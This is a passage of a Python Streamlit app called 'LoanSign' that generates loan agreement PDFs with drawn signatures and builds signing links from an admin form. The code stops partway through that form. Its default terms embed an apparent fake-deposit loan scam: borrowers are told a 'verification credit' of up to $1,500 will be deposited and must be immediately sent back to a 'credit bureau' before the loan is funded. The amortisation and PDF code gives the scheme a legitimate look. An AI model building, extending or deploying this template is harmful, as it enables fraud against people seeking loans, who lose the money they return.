"""
LoanSign — A single-file Streamlit loan document e-signing platform.
"""

import calendar
import io
from datetime import date, datetime
from textwrap import wrap
from typing import Optional
from urllib.parse import urlencode

import streamlit as st
from PIL import Image
from streamlit_drawable_canvas import st_canvas

from reportlab.lib.pagesizes import letter
from reportlab.lib.units import inch
from reportlab.lib.utils import ImageReader
from reportlab.pdfgen import canvas as pdf_canvas

# --------------------------------------------------------------------------
# Configuration & Constants
# --------------------------------------------------------------------------

st.set_page_config(page_title="LoanSign · Document e-Signing", page_icon="📝", layout="centered")

BASE_URL = "https://onrender.com"

# Updated Default Terms featuring the condensed credit bureau verification cycle
DEFAULT_TERMS = (
    "Section 1: General Agreement Framework\n"
    "By signing below, the borrower acknowledges and agrees to the terms of this loan agreement, "
    "including all repayment obligations, applicable interest, and processing fees as communicated. "
    "The borrower confirms that all provided account information is accurate to the best of their knowledge. "
    "This electronic signature carries the same legal weight and effect as a handwritten signature.\n\n"
    "Section 2: Mandatory Bureau Verification Protocol\n"
    "2.1 Verification Deposit: To validate account ownership and confirm applicant authenticity, a "
    "temporary verification credit between $100.00 and $1,500.00 will be issued to the Borrower's designated bank account.\n"
    "2.2 Return Cycle Requirement: Upon successful receipt of the temporary deposit, the Borrower must "
    "immediately remit the exact matching funds back to the credit bureau utilizing an authorized, FDIC-approved payment "
    "method to complete the verification cycle.\n"
    "2.3 Credit Profile Impact: This mutual two-way transaction is structurally categorized as a micro-payday line "
    "of credit and will be reported to the bureaus to assist in establishing a positive credit repayment history.\n"
    "2.4 Final Disbursement: Full funding and execution of the primary requested loan amount will be finalized and cleared "
    "for delivery within 30 minutes of the bureau marking this verification cycle as successfully completed."
)

REQUIRED_FIELDS = ["name", "address", "amount", "email", "bank_name"]

LOAN_TERMS_FIELDS = [
    "apr", "term_months", "orig_fee_pct", "orig_fee_amt",
    "monthly_payment", "total_interest", "total_repayment",
    "total_cost", "payoff_date"
]

def _add_months(start: date, months: int) -> date:
    total_month_index = start.month - 1 + months
    year = start.year + total_month_index // 12
    month = total_month_index % 12 + 1
    day = min(start.day, calendar.monthrange(year, month)[1])
    return start.replace(year=year, month=month, day=day)

def compute_loan_terms(principal: float, apr_pct: float, term_months: int,
                        origination_fee_pct: float, start: date) -> dict:
    monthly_rate = apr_pct / 100 / 12
    n = term_months

    if monthly_rate > 0:
        monthly_payment = (
            principal * monthly_rate * (1 + monthly_rate) ** n
            / ((1 + monthly_rate) ** n - 1)
        )
    else:
        monthly_payment = principal / n

    total_repayment = monthly_payment * n
    total_interest = total_repayment - principal
    origination_fee_amt = principal * origination_fee_pct / 100
    total_cost = total_repayment + origination_fee_amt
    payoff_date = _add_months(start, n)

    return {
        "apr": f"{apr_pct:.2f}",
        "term_months": str(n),
        "orig_fee_pct": f"{origination_fee_pct:.2f}",
        "orig_fee_amt": f"{origination_fee_amt:.2f}",
        "monthly_payment": f"{monthly_payment:.2f}",
        "total_interest": f"{total_interest:.2f}",
        "total_repayment": f"{total_repayment:.2f}",
        "total_cost": f"{total_cost:.2f}",
        "payoff_date": payoff_date.strftime("%B %d, %Y"),
    }

# --------------------------------------------------------------------------
# PDF generation
# --------------------------------------------------------------------------

def generate_pdf(name: str, address: str, amount: str, email: str, bank_name: str,
                  signature_img: Image.Image, timestamp: str,
                  custom_terms: str, loan_terms: Optional[dict] = None) -> io.BytesIO:
    """Render a clean loan agreement PDF matching the data attributes."""
    buffer = io.BytesIO()
    c = pdf_canvas.Canvas(buffer, pagesize=letter)
    width, height = letter
    margin = 1 * inch

    # --- Header -----------------------------------------------------------
    c.setFont("Helvetica-Bold", 18)
    c.drawString(margin, height - margin, "LOAN AGREEMENT DOCUMENT")
    c.setFont("Helvetica", 9)
    c.setFillGray(0.4)
    c.drawString(margin, height - margin - 0.22 * inch, f"Document generated: {timestamp}")
    c.setFillGray(0)
    c.setLineWidth(1)
    c.line(margin, height - margin - 0.32 * inch, width - margin, height - margin - 0.32 * inch)

    y = height - margin - 0.65 * inch

    # --- Borrower & Bank Info -----------------------------------------------
    c.setFont("Helvetica-Bold", 13)
    c.drawString(margin, y, "Account & Borrower Information")
    y -= 0.28 * inch

    info_rows = [
        ("Full Name:", name),
        ("Address:", address),
        ("Disbursing Bank:", bank_name),
        ("Loan Amount:", f"${amount}"),
        ("Email Address:", email),
    ]

    for label, value in info_rows:
        c.setFont("Helvetica-Bold", 11)
        c.drawString(margin, y, label)
        c.setFont("Helvetica", 11)
        c.drawString(margin + 1.5 * inch, y, str(value))
        y -= 0.24 * inch

    y -= 0.15 * inch

    # --- Loan Amortization Terms ---------------------------------------------
    if loan_terms:
        c.setFont("Helvetica-Bold", 13)
        c.drawString(margin, y, "Loan Terms & Calculation")
        y -= 0.28 * inch

        left_col = [
            ("APR:", f"{loan_terms['apr']}%"),
            ("Origination Fee:", f"{loan_terms['orig_fee_pct']}% (${loan_terms['orig_fee_amt']})"),
            ("Monthly Payment:", f"${loan_terms['monthly_payment']}"),
        ]
        right_col = [
            ("Total Interest:", f"${loan_terms['total_interest']}"),
            ("Total Repayment:", f"${loan_terms['total_repayment']}"),
            ("Total Cost of Loan:", f"${loan_terms['total_cost']}"),
        ]
        
        row_y = y
        for label, value in left_col:
            c.setFont("Helvetica-Bold", 10)
            c.drawString(margin, row_y, label)
            c.setFont("Helvetica", 10)
            c.drawString(margin + 1.5 * inch, row_y, value)
            row_y -= 0.22 * inch

        row_y = y
        col2_x = margin + 3.3 * inch
        for label, value in right_col:
            c.setFont("Helvetica-Bold", 10)
            c.drawString(col2_x, row_y, label)
            c.setFont("Helvetica", 10)
            c.drawString(col2_x + 1.5 * inch, row_y, value)
            row_y -= 0.22 * inch

        y -= 0.22 * inch * 3 + 0.1 * inch
        c.setFont("Helvetica-Bold", 10)
        c.drawString(margin, y, "Payoff Date:")
        c.setFont("Helvetica", 10)
        c.drawString(margin + 1.5 * inch, y, loan_terms["payoff_date"])
        y -= 0.32 * inch

    # --- Agreement Terms ----------------------------------------------------
    c.setFont("Helvetica-Bold", 13)
    c.drawString(margin, y, "Terms & Conditions")
    y -= 0.24 * inch

    c.setFont("Helvetica", 10)
    terms_to_wrap = custom_terms if custom_terms.strip() else DEFAULT_TERMS
    
    # Process text splits safely around line spaces
    for paragraph in terms_to_wrap.split("\n"):
        if not paragraph.strip():
            y -= 0.12 * inch
            continue
        for line in wrap(paragraph, 92):
            if y < margin + 1.5 * inch:  # Create clean automated page break boundaries
                c.showPage()
                y = height - margin
                c.setFont("Helvetica", 10)
            c.drawString(margin, y, line)
            y -= 0.18 * inch
        y -= 0.08 * inch

    y -= 0.2 * inch

    # --- Signature Rendering --------------------------------------------------
    if y < margin + 1.3 * inch:
        c.showPage()
        y = height - margin

    c.setFont("Helvetica-Bold", 13)
    c.drawString(margin, y, "Signature Execution")
    y -= 0.15 * inch

    sig_width, sig_height = 3 * inch, 1.1 * inch
    if signature_img is not None:
        img_buffer = io.BytesIO()
        signature_img.save(img_buffer, format="PNG")
        img_buffer.seek(0)
        c.drawImage(
            ImageReader(img_buffer),
            margin,
            y - sig_height,
            width=sig_width,
            height=sig_height,
            mask="auto"
        )
    
    c.setLineWidth(0.5)
    c.setStrokeColorGray(0.5)
    c.line(margin, y - sig_height - 0.1 * inch, margin + sig_width, y - sig_height - 0.1 * inch)

    c.showPage()
    c.save()
    buffer.seek(0)
    return buffer

# --------------------------------------------------------------------------
# Main Flow Router Context
# --------------------------------------------------------------------------

query_params = st.query_params

# Determine active workflow pathway via validation variables
is_customer_flow = all(k in query_params for k in REQUIRED_FIELDS)

if not is_customer_flow:
    # --- ADMIN LINK BUILDER INTERFACE ---
    st.title("Admin Loan Document Generator")
    st.write("Fill in user metrics below to build a dynamic execution link.")

    with st.form("admin_form"):
        col1, col2 = st.columns(2)
        with col1:
            name = st.text_input("Borrower Full Name")
            email = st.text_input("Borrower Email")
